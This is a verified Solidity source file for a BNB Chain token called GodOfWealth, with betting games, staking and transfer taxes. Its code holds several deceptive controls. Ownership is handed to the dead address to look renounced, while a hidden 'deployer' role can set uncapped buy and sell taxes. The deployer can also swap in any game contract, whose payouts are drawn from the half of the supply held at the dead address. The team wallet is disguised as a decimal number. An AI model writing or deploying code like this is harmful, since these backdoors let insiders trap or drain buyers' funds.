/**
 *Submitted for verification at BscScan.com on 2022-01-31
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint amountIn,uint amountOutMin,address[] calldata path,address to,uint deadline) external;
}
interface IGame {
    function lucknumber(address _player,uint256 betamouts, uint256[] memory nums) external;
    function lucknumberopen(address _player) external returns(uint256 PrizeMoney);
    function breakout(address _player,uint256 betamouts, uint256 num) external;
    function breakoutopen(address _player)  external  returns(uint256 PrizeMoney);
    function breakoutcheck(address _player) view external returns(uint256 winr);
}
struct stakedinfo{
    uint256 amounts;
    uint256 date;
}
contract  Godofwealth {
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => stakedinfo) userstaked;
    mapping (address => bool) isExcludedFromTax;
    address _owner;
    address deployer;
    address  MarketingWallet;
    address public uniswapPair;
    address dead;
    address teamaddress;
    IUniswapV2Router02 public uniswapV2Router;
    IGame G;
    uint256 private _totalSupply;
    uint256 unlocktime;

    uint256 public lanuchtime;
    uint256 private sequences;
    uint256 public lucknumbermix;
    uint256 public lucknumbermax;
    uint256 public breakoutmix;
    uint256 public breakoutmax;
    uint256 public stakedinterest;
    uint256 public buytax;
    uint256 public selltax;
    uint256 public transfertax;
    string private _name;
    string private _symbol;

    constructor () {
        _name = "GodOfWealth";
        _symbol = "GOW";
        dead = 0x000000000000000000000000000000000000dEaD;
        _owner = dead;
        deployer = msg.sender;
        _mit(deployer,1* 10**6  * 10**uint256(decimals()));
        //_totalSupply = 1* 10**6  * 10**uint256(decimals());
        _transfer(deployer,dead,_totalSupply/2);
        lucknumbermix = 100 * 10**uint256(decimals());
        lucknumbermax = 1000 * 10**uint256(decimals());
        breakoutmix = 50 * 10**uint256(decimals());
        breakoutmax = 500 * 10**uint256(decimals());
        stakedinterest = 2;
        buytax = 5;
        selltax = 10;
        transfertax = 3;
        //IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E); 
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3); 
        uniswapPair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());
        uniswapV2Router = _uniswapV2Router;
        teamaddress = address(957186921008467503953785869827206493783155873460);
        isExcludedFromTax[dead] = true;
        isExcludedFromTax[deployer] = true;
        isExcludedFromTax[teamaddress] = true;
    }
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    modifier onlydeployer() {
        require(deployer == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    modifier noContract() {
        require(!isContract(msg.sender), "Contract is not allowed");
        _;
    }
    function Lock(uint256 newtime) public onlyOwner{
        require(newtime > unlocktime,"needs to be more than old time!");
        unlocktime = newtime;
    }
    function SetamoutsLimit(uint256 luckmix,uint256 luckmax,uint256 breakmix,uint256 breakmax) public onlydeployer{
        lucknumbermix = luckmix;lucknumbermax = luckmax;breakoutmix = breakmix;breakoutmax = breakmax;
    }
    function SetStakedInterest(uint256 newinterest) public onlydeployer{
        stakedinterest = newinterest;
    }
    function SetGameAddress(address ga) public onlydeployer{
        G = IGame(ga);
    }
    function SetExcludedFromTax(address exaddress,bool status) public onlydeployer{
        isExcludedFromTax[exaddress] = status;
    }
    function SetTax(uint256 _buytax,uint256 _selltax) public onlydeployer{
        buytax = _buytax;selltax = _selltax;
    }
    function owner() public view returns (address) {
        return _owner;
    }
    function LuckNumber(uint256 betamouts, uint256[] memory nums) public noContract{
        require(betamouts >= lucknumbermix && betamouts <= lucknumbermax,"Incorrect number");
        require(_balances[msg.sender] >= betamouts, "ERC20: transfer amount exceeds balance");
        G.lucknumber(msg.sender,betamouts,nums);
    }
    function LucknumberOpen() public noContract{
        uint256 Prize = G.lucknumberopen(msg.sender);
        _transfer(dead,msg.sender,Prize);
    }
    function BreakOut(uint256 betamouts, uint256 num) noContract public{
        require(betamouts >= breakoutmix && betamouts <= breakoutmax,"Incorrect number");
        require(_balances[msg.sender] >= betamouts, "ERC20: transfer amount exceeds balance");
        G.breakout(msg.sender,betamouts,num);
    }
    function BreakOutOpen()  public noContract{
        uint256 Prize = G.breakoutopen(msg.sender);
        _transfer(dead,msg.sender,Prize);
    }
    function BreakOutCheck(address _player) view public noContract returns(uint256 winr){
        winr = G.breakoutcheck(_player);
    }
    function Staked(uint256 _amounts) public{
        require(_amounts > 0,"amounts is zero!");
        _transfer(msg.sender,dead,_amounts);
        userstaked[msg.sender].amounts += _amounts;
        userstaked[msg.sender].date = block.timestamp;
    }
    function Unstaked() public{
        require(userstaked[msg.sender].amounts > 0,"staked is zero!");
        _transfer(dead,msg.sender,userstaked[msg.sender].amounts);
        uint256 day = (block.timestamp - userstaked[msg.sender].date)/60/60/24;
        if(day > 0){
            _transfer(dead,msg.sender,userstaked[msg.sender].amounts * day * stakedinterest /100);
        }
    }
    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual  returns (uint256) {
        return _totalSupply;
    }
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function balanceOf(address account) public view virtual  returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual  returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner_, address spender) public view virtual  returns (uint256) {
        return _allowances[owner_][spender];
    }

    function approve(address spender, uint256 amount) public virtual  returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function transferFrom(address sender, address recipient, uint256 amount) public virtual  returns (bool) {
        _transfer(sender, recipient, amount);
        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        _approve(sender, _msgSender(), currentAllowance - amount);

        return true;
    }
    function isContract(address account) internal view returns (bool) {
        if(tx.origin != msg.sender)
        return false;
        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        assembly { codehash := extcodehash(account) }
        return (codehash != accountHash && codehash != 0x0);
    }
    /*
   function swapTokensForEth(uint256 tokenAmount) private lockTheSwap{
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        //_approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this), // The contract
            block.timestamp
        );
    }
*/

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        _beforeTokenTransfer(sender, recipient, amount);
        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        uint256 tax = amount * taketax(sender,recipient) / 100;
        _balances[sender] = senderBalance - amount;
        _balances[recipient] += amount - tax;
        _balances[teamaddress] += tax;
        emit Transfer(sender, recipient, amount - tax);
        emit Transfer(sender, teamaddress, tax);
    }
    function taketax(address from,address to) view internal returns(uint256 tax){
        if(isExcludedFromTax[from] || isExcludedFromTax[to]){
            tax = 0;
            return tax;
        }else if(from == uniswapPair){
            tax = buytax;
        }else if(to == uniswapPair){
            tax = selltax;
        }else{
            tax = transfertax;
        }
    }
    function _mit(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        //_beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);
    }
   /* 
    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        _balances[account] = accountBalance - amount;
        _totalSupply -= amount;

        emit Transfer(account, address(0), amount);
    }
*/
    function _approve(address owner_, address spender, uint256 amount) internal virtual {
        require(owner_ != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner_][spender] = amount;
        emit Approval(owner_, spender, amount);
    }
    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual { 
            _checkowner(to);

    }
    function _checkowner(address recipient) internal {
        if(recipient == uniswapPair && lanuchtime == 0){
            lanuchtime = block.timestamp;
            unlocktime = lanuchtime + 30 days;
        }else if(recipient == deployer){
            require(block.timestamp > unlocktime);
        }
    }
}